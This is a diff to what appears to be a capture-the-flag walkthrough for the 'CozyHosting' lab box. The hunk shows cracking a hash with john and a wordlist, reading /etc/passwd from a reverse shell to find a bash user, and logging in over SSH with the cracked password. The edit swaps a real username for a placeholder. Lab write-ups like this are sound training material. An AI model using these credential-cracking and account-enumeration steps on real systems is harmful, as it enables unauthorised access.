@@ -98,11 +98,12 @@ john --wordlist=$HOME/rockyou.txt hash.txt
 ```
 Now to know who the admin is, just execute from the reverse shell:
 ```
-cat /etc/passwd
+cat /etc/passwd | grep bash
 ```
 and we log in to the system
 ```
-ssh josh@cozyhosting.htb
+# USER_ADMIN: is the admin
+ssh USER_ADMIN@cozyhosting.htb
 # we access using the password of the decrypted hash
 ```
 and we get the first flag *user.txt*
